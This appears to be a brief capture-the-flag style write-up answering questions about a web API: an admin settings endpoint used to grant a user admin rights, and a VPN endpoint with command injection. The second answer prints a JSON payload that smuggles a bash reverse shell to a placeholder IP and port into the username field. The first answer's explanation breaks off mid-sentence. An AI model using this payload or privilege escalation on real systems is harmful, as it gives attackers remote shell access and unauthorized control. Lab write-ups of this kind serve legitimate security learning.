Q: What API endpoint can change a user account to an admin account?
A: /api/v1/admin/settings/update
(Don't forget content-type: application/json) , on this api it said in the response "is_admin":0 ,so i made request with

Q: What API endpoint has a command injection vulnerability in it?
A: /api/v1/admin/vpn/generate
For some reason the api asked for "username" in the json request but never checked if its a valid one, so the payload looked like this,
{"username":"testy@gmail.com$(bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1')"}
